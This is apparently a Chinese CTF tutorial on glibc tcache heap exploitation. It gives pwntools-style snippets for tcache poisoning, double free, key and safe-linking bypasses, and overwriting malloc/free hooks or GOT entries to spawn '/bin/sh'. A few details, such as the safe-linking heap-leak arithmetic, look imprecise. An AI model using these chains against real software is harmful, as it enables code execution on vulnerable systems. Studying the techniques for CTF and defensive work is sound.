# Tcache 攻击

## 原理

glibc 2.26+ 引入 tcache（Thread Local Caching），每个线程维护一个 tcache，加速小堆块分配。tcache 安全检查较弱，成为堆利用的主要攻击面。

## Tcache 结构

```c
// tcache_entry
typedef struct tcache_entry {
    struct tcache_entry *next;  // fd 指针
    struct tcache_perthread_struct *key;  // glibc 2.29+，用于检测 double free
} tcache_entry;

// tcache_perthread_struct
typedef struct tcache_perthread_struct {
    uint16_t counts[TCACHE_MAX_BINS];  // 每个 bin 的数量
    tcache_entry *entries[TCACHE_MAX_BINS];  // 每个 bin 的链表头
} tcache_perthread_struct;
```

## Tcache 特点

- 大小范围：0x20 - 0x410（64位），步长 0x10
- 每个 bin 最多 7 个 chunk
- LIFO（后进先出）
- 无合并
- 无 size 检查（glibc < 2.32）
- 无对齐检查（glibc < 2.32）

## 攻击链

### 1. Tcache Poisoning

```python
from pwn import *

p = process('./pwn')

# 1. 分配
malloc(0x20)  # idx 0
# 2. 释放
free(0)
# 3. UAF 修改 fd
edit(0, p64(target_addr))
# 4. 分配两次
malloc(0x20)  # idx 1，返回原 idx 0
malloc(0x20)  # idx 2，返回 target_addr
```

### 2. Tcache Double Free

```python
# glibc < 2.29 无 key 检测
malloc(0x20)  # idx 0
free(0)
free(0)  # double free
# tcache: chunk -> chunk -> ...
malloc(0x20)  # idx 1，返回 chunk
edit(1, p64(target_addr))  # 修改 fd
malloc(0x20)  # idx 2，返回 chunk
malloc(0x20)  # idx 3，返回 target_addr
```

### 3. 绕过 tcache key (glibc 2.29+)

```python
# glibc 2.29+ 加了 key 字段检测 double free
# key = tcache_perthread_struct 地址
# 绕过方法：覆盖 key

malloc(0x20)  # idx 0
free(0)
# UAF 覆盖 key
edit(0, p64(target_addr) + p64(0))  # 覆盖 fd 和 key
free(0)  # 再次 free，绕过 key 检测
```

### 4. Tcache Stashing Unlink Attack

```python
# 利用 tcache 和 smallbin 的交互
# 当 smallbin 中的 chunk 被分配时，剩余 chunk 会被放入 tcache

# 1. 填满 tcache
for i in range(7):
    malloc(0x90)  # idx 0-6
malloc(0x90)  # idx 7
malloc(0x20)  # idx 8，防止合并
# 2. 释放 7 个填满 tcache
for i in range(7):
    free(i)
# 3. 释放 idx 7，进入 unsorted bin
free(7)
# 4. 分配大 chunk，触发 idx 7 进入 smallbin
malloc(0x100)  # idx 9
# 5. 分配 7 个清空 tcache
for i in range(7):
    malloc(0x90)
# 6. 修改 smallbin 中 chunk 的 bk
# 7. 分配 0x90，触发 tcache stashing unlink
# target_addr 处的 chunk 被放入 tcache
```

### 5. Safe-Linking 绕过 (glibc 2.32+)

```python
# glibc 2.32+ 引入 safe-linking
# fd 指针加密：ptr = (chunk_addr >> 12) ^ next_ptr
# 需要知道堆地址才能伪造

# 1. 泄露堆地址
malloc(0x20)  # idx 0
malloc(0x20)  # idx 1
free(0)
free(1)
# UAF 读取 idx 1 的 fd
encrypted_fd = u64(read(1, 8))
heap_addr = encrypted_fd ^ 0  # 第一个块的 next 是 0
# 或
heap_addr = encrypted_fd ^ (idx1_addr >> 12)

# 2. 构造加密的 fd
target = 0x404000
chunk_addr = heap_addr + offset
encrypted = (chunk_addr >> 12) ^ target
edit(idx, p64(encrypted))
```

## 利用场景

### 1. 覆盖 __malloc_hook

```python
# glibc < 2.34
malloc(0x20)  # idx 0
free(0)
edit(0, p64(malloc_hook))
malloc(0x20)  # idx 1
malloc(0x20)  # idx 2，返回 malloc_hook
edit(2, p64(one_gadget))
p.sendline(b'1')  # 触发 malloc
```

### 2. 覆盖 __free_hook

```python
# glibc < 2.34
malloc(0x20)  # idx 0
free(0)
edit(0, p64(free_hook))
malloc(0x20)  # idx 1
malloc(0x20)  # idx 2，返回 free_hook
edit(2, p64(system))
edit(0, b'/bin/sh\x00')
free(0)
```

### 3. 覆盖 GOT 表

```python
# Partial RELRO
malloc(0x20)  # idx 0
free(0)
edit(0, p64(elf.got['free']))
malloc(0x20)  # idx 1
malloc(0x20)  # idx 2，返回 GOT 表
edit(2, p64(system))
edit(0, b'/bin/sh\x00')
free(0)
```

### 4. 分配到栈上

```python
# 1. 泄露栈地址（通过 _environ）
# 2. tcache poisoning 分配到栈上
# 3. 覆盖返回地址
```

### 5. 分配到 TLS

```python
# glibc 2.34+
# 覆盖 TLS 中的 __stack_chk_guard
# 覆盖 TLS 中的 __exit_funcs
```

## 2024-2026 新技术点

### 1. glibc 2.34+ 无 hooks

```python
# 传统 __malloc_hook/__free_hook 失效
# 新利用方法：
# 1. IO_FILE 攻击（House of Apple 系列）
# 2. exit_funcs 利用
# 3. _environ 泄露栈地址
# 4. TLS 劫持
```

### 2. safe-linking 加固

```python
# glibc 2.32+
# 需要泄露堆地址才能伪造 fd
# 增加利用难度
```

### 3. tcache key 加固

```python
# glibc 2.29+ tcache key
# glibc 2.34+ 加强 key 检测
# double free 检测更严格
# 需要绕过 key
```

### 4. House of Apple 系列

```python
# House of Apple 2/3
# 针对 glibc 2.34+
# 通过 tcache poisoning + IO_FILE 实现 RCE
```

### 5. House of Cat

```python
# 2024 年新利用链
# 针对 glibc 2.35+
# 通过 tcache + IO_FILE 实现 RCE
```

### 6. per-thread cache

```python
# 多线程环境
# 每个线程有自己的 tcache
# 需要考虑线程安全
```

### 7. 硬件级防护

```python
# Intel CET
# ARM PAC/BTI
# MTE (Memory Tagging Extension)
# 影响 tcache 利用
```

### 8. 沙箱环境

```python
# seccomp 限制
# 通过 ORW (open/read/write) 绕过
# 通过侧信道绕过
```

## 工具推荐

- **pwntools** — Python 利用框架
- **gdb + pwndbg** — 动态调试（tcache 命令）
- **heap-viewer** — 堆可视化

## 参考链接

- [ctf-wiki tcache](https://ctf-wiki.org/pwn/linux/glibc-heap/tcache_attack/)
- [how2heap tcache](https://github.com/shellphish/how2heap/tree/master/glibc_2.26)
- [Tcache Attack](https://www.jianshu.com/p/4d7d7a460c0c)
